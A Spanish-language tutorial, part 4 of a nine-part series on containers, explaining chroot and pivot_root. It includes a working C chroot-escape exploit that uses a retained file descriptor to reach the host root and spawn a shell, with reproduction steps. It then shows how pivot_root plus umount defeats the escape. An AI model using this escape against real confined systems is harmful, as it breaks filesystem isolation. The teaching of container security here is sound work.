@@ -1,0 +1,119 @@
+¿Qué es realmente un contenedor?
+Parte 4 de 9
+chroot y pivot_root: cambiando la raíz del filesystem
+El aislamiento de red y procesos que dan los namespaces no sirve de nada si el proceso puede leer /etc/shadow del host o modificar binarios del sistema. Para aislar el filesystem necesitamos cambiar lo que el proceso considera su directorio raíz (/). Linux ofrece dos mecanismos para esto: chroot y pivot_root.
+chroot: el mecanismo clásico
+chroot(2) es una syscall que cambia el directorio raíz del proceso (y sus hijos) a un directorio arbitrario. Existe desde Unix v7 (1979). Su uso es simple:
+# Preparar un rootfs mínimo con Alpine
+mkdir /tmp/rootfs
+docker export $(docker create alpine) | tar -xC /tmp/rootfs
+# Entrar con chroot
+sudo chroot /tmp/rootfs /bin/sh
+# Dentro del chroot:
+ls / # Ve el rootfs de Alpine, no el del host
+cat /etc/os-release # Alpine Linux
+El proceso cree que /tmp/rootfs es su /. No puede navegar "arriba" con cd /../../../ — el kernel bloquea esa travesía.
+El problema de chroot: no es seguro
+chroot tiene una limitación crítica: un proceso con CAP_SYS_CHROOT puede escapar. El cd .. desde la raíz no funciona — el kernel lo bloquea. El ataque real aprovecha que chroot() solo cambia el puntero de directorio raíz; no cierra los file descriptors abiertos. Un FD abierto antes del segundo chroot sigue apuntando a su inode original, fuera del nuevo jail:
+// escape.c — fuente del exploit
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/stat.h>
+int main(void) {
+int fd = open(".", O_RDONLY); // FD al cwd actual (dentro del jail original)
+mkdir("sub", 0755);
+chroot("sub"); // Nuevo chroot; el FD sigue apuntando afuera
+fchdir(fd); // cwd = el FD → ahora el cwd está "arriba" del nuevo root
+for (int i = 0; i < 1024; i++) chdir(".."); // Subir hasta el / real del host
+chroot("."); // Hacer de ese / el nuevo root
+execl("/bin/sh", "sh", NULL); // Shell con visión del filesystem del host
+}
+Para reproducir el escape:
+# 0) Referencia: estamos en el host (Ubuntu)
+$ cat /etc/os-release | head -1
+# PRETTY_NAME="Ubuntu 24.04.4 LTS" ← punto de partida: host
+# 1) En el host, FUERA del chroot: compilar estático y dejar el binario
+# dentro del rootfs. Estático porque Alpine usa musl (distinta libc
+# que Ubuntu/Debian/glibc) y un binario dinámico no resolvería sus
+# símbolos dentro del chroot. En Ubuntu el paquete es libc6-dev.
+gcc -static escape.c -o /tmp/rootfs/escape
+# 2) Entrar al chroot y ejecutar el binario
+sudo chroot /tmp/rootfs /bin/sh
+/ # cat /etc/os-release | head -1
+# PRETTY_NAME="Alpine Linux v3.23" ← estás en Alpine (dentro del jail)
+/ # ./escape
+# (el prompt cambia; el nuevo shell es del host)
+$ cat /etc/os-release | head -2
+# PRETTY_NAME="Ubuntu 24.04.4 LTS"
+# NAME="Ubuntu" ← estás en el HOST, fuera del jail
+$ exit # cierra el shell del host
+/ # cat /etc/os-release | head -1
+# PRETTY_NAME="Alpine Linux v3.23" ← de vuelta en el chroot original
+Este es el motivo por el que OCI / runc no usan chroot en producción — incluso con cero capabilities extra, tener CAP_SYS_CHROOT ya es suficiente.
+Además, chroot solo aisla el filesystem. Los procesos del host siguen visibles (ps aux muestra todo), la red es compartida, y los mounts del host siguen accesibles si el atacante sabe cómo montarlos.
+pivot_root: el mecanismo de producción
+pivot_root(2) hace algo más robusto: intercambia el directorio raíz actual con uno nuevo, moviendo el antiguo raíz a un directorio especificado. A diferencia de chroot, opera a nivel de mount namespace — el resultado es un cambio real en la tabla de montajes, no solo en el puntero de directorio raíz del proceso.
+# El flujo que usa runc:
+# 1. Crear un nuevo mount namespace
+# 2. Montar el rootfs del contenedor como un bind mount
+# 3. Usar pivot_root para hacer ese mount el nuevo /
+# 4. Desmontar el viejo / (ahora en /.old_root)
+# 5. Hacer rmdir de /.old_root
+# Demostración manual:
+sudo unshare --mount bash
+# Dentro del nuevo mount namespace:
+# 1) Propagación privada — requisito del kernel para pivot_root.
+# util-linux lo aplica automático con --mount (default --propagation
+# private); lo mostramos explícito para que el paso que el kernel
+# exige sea visible. Herramientas que llaman unshare(2) sin pasar por
+# util-linux (runc, crun, youki) lo hacen ellas mismas — si se omite,
+# pivot_root falla con "EINVAL: Invalid argument".
+mount --make-rprivate /
+# 2) Preparar el new_root como bind mount sobre sí mismo
+mkdir -p /tmp/newroot
+mount --bind /tmp/rootfs /tmp/newroot
+cd /tmp/newroot
+# 3) Crear el directorio put_old DESPUÉS del bind mount.
+# Si lo creas antes, el bind mount lo oculta y pivot_root falla con
+# "No such file or directory".
+mkdir -p .old_root
+# 4) pivot_root
+pivot_root . .old_root
+# OJO: el hash de bash aún apunta a /usr/bin/ls del host. Como Alpine
+# tiene ls en /bin/ls, hay que limpiar el cache o usar rutas relativas.
+hash -r # limpia el cache de comandos del shell
+ls / # Alpine
+ls /.old_root # El filesystem original del host
+# Desmontar el viejo root (cortar el acceso)
+umount -l /.old_root
+rmdir /.old_root
+ls / # Solo Alpine. El host desapareció.
+Valida que el escape de chroot ya no funciona: con el escape compilado del apartado anterior en el rootfs, ejecútalo aquí:
+# Dentro del mount namespace pivot_rooteado (con el viejo root ya umount-ado)
+./escape
+ls /
+# bin dev escape escape.c etc home lib ... var ← sigue siendo Alpine
+# El escape falló: no hay tabla de montajes "vieja" a la que llegar con el FD.
+Por qué pivot_root es superior a chroot
+La diferencia está en el nivel de la operación. chroot cambia un único campo en el task_struct del proceso — su puntero de directorio raíz — y nada más; la tabla de montajes del kernel queda intacta. Por eso el filesystem del host sigue montado, solo está oculto al proceso, no desmontado. Un FD obtenido antes del segundo chroot te sirve para reconstruir la ruta hacia él: es justo lo que hizo el escape.c que corriste — compiló, se ejecutó y te sacó a Ubuntu.
+pivot_root opera un nivel más abajo: reorganiza la tabla de montajes del mount namespace. Mueve el root viejo a un directorio dentro del nuevo, y tú explícitamente haces umount -l sobre ese directorio. Después del umount, el filesystem del host ya no está montado en ninguna parte visible para ese namespace. El mismo escape.c ejecutado ahí dentro se queda atrapado en Alpine: no hay inode del host alcanzable desde la tabla de montajes actual, así que por más FDs que se abran el salto no tiene destino.
+El precio es que pivot_root no se puede llamar desde cualquier contexto. Exige estar en un mount namespace propio (si no, la reorganización afectaría a todo el sistema) y que la propagación del árbol sea privada — los dos pasos que hiciste al inicio con unshare --mount y mount --make-rprivate /.
+Por eso todos los runtimes OCI — runc, crun, youki — usan pivot_root, y solo caen a chroot en entornos restrictivos donde no hay mount namespace disponible. chroot aislado no es una frontera de seguridad; pivot_root + umount sí lo es.
+Lo que hace runc en la práctica
+El código de runc (el runtime OCI de referencia) usa pivot_root cuando está disponible, y solo cae a chroot como fallback en entornos muy restrictivos. La secuencia real en pseudocódigo:
+// 1. Crear mount namespace
+clone(CLONE_NEWNS)
+// 2. Montar el bundle del contenedor
+mount(bundlePath, containerRoot, MS_BIND|MS_REC)
+// 3. Montar /proc, /dev, /sys del contenedor
+mount("proc", containerRoot+"/proc", "proc", ...)
+mount("tmpfs", containerRoot+"/dev", "tmpfs", ...)
+// 4. pivot_root
+chdir(containerRoot)
+pivot_root(".", ".old_root")
+chdir("/")
+// 5. Limpiar el viejo root
+umount2(".old_root", MNT_DETACH)
+rmdir(".old_root")
+// 6. Ahora el proceso vive completamente en el rootfs del contenedor
+El resultado es que el proceso no tiene ninguna referencia al filesystem del host. Ni siquiera un file descriptor abierto puede usarse para navegar al sistema de archivos original.
